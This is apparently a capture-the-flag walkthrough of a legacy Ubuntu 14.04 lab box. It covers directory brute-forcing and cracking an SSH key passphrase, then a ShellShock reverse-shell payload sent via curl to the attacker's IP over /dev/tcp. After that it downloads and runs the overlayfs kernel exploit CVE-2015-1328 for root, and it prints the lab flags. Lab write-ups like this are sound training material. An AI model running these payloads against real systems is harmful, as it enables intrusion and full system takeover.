0day

Exploit Ubuntu, like a Turtle in a Hurricane.
Box
0day
OS
Ubuntu 14.04.1 LTS
Difficulty
Medium

rooted

Path: ShellShock foothold -> overlayfs kernel exploit (CVE-2015-1328) for root.

A quick note on IPs so the commands make sense:

  • Target: 10.113.175.135
  • My attacker box (tun0): 192.168.141.44

1. Recon

Started with a service scan to see what I was dealing with.

nmap -sV 10.113.175.135

Only two ports open: 22 (SSH) and 80 (HTTP). That already tells me the plan: the web server is my attack surface, and SSH is probably a foothold I come back to later if I find creds or a key.

2. Web enumeration

Opened port 80 in the browser. It is a personal portfolio page ("Ryan Montgomery / 0day"), nothing clickable that leads anywhere useful. So I brute-forced directories.

gobuster dir -u http://10.113.175.135:80 -w directory-list-2.3-medium.txt

Almost every hit was a dead link. The one that mattered was /backup/.

http://10.113.175.135/backup/

Inside I found an encrypted RSA private key.

3. The RSA key (and why it is a dead end)

Saved the key as id_rsa. It is passphrase-protected, so I converted it to a John-crackable hash and ran it against rockyou.

python3 /usr/lib/john/ssh2john.py id_rsa > key.hash
john --wordlist=rockyou.txt key.hash

Passphrase cracked: letmein.

Important: letmein is the passphrase for the key, not an SSH password. I tried to log in with the key anyway and got access denied. The key is a rabbit hole. The real way onto this box is the web server, so I moved on instead of grinding on SSH.

4. Foothold - ShellShock (CVE-2014-6271)

Ubuntu 14.04 plus a cgi-bin directory is a classic ShellShock setup. The vuln lets you smuggle a command into a CGI script through the User-Agent header, because Bash evaluates the function definition you pass it.

Set up a listener first:

nc -lvnp 4444

Then fired the payload at the CGI script and got a reverse shell:

curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.141.44/4444 0>&1" \
  http://10.113.175.135/cgi-bin/test.cgi

Caught the shell as www-data. Grabbed the user flag:

cat /home/ryan/user.txt
THM{Sh3llSh0ck_r0ckz}

5. Privilege escalation - overlayfs (CVE-2015-1328)

Checked what kernel I was sitting on.

cat /etc/os-release
# Ubuntu 14.04.1 LTS (x86_64)
# Kernel 3.13.0-32-generic

That kernel is vulnerable to CVE-2015-1328, an overlayfs local privilege escalation. It lets an unprivileged user get root because of how overlayfs handled file permissions in that version. The public exploit is 37292.c.

Served the exploit from my box:

# attacker
python3 -m http.server 9000

# target (www-data)
wget http://192.168.141.44:9000/37292.c

Tried to compile and run it:

gcc 37292.c -o ofs
chmod +x ofs
./ofs

The exploit started, then died with:

gcc: error trying to exec 'cc1': execvp: No such file or directory

The fix

cc1 is the actual C compiler backend that gcc calls. It was installed but not on www-data's PATH, so gcc could not find it. I pointed PATH straight at the gcc internal directory and re-ran:

export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.8
./ofs

This time it compiled and ran clean. Root shell.

cd /root
cat root.txt
THM{g00d_j0b_0day_is_Pleased}

Takeaways

  • Two open ports narrowed the whole box down fast. Web first, SSH as a maybe.
  • The cracked RSA key was a deliberate distraction. Recognising a rabbit hole and leaving it is a skill on its own.
  • ShellShock is old but still shows up on legacy Ubuntu with cgi-bin.
  • A failing exploit is not always the wrong exploit. The cc1 error was an environment problem, not a vuln problem, and fixing PATH was all it took.
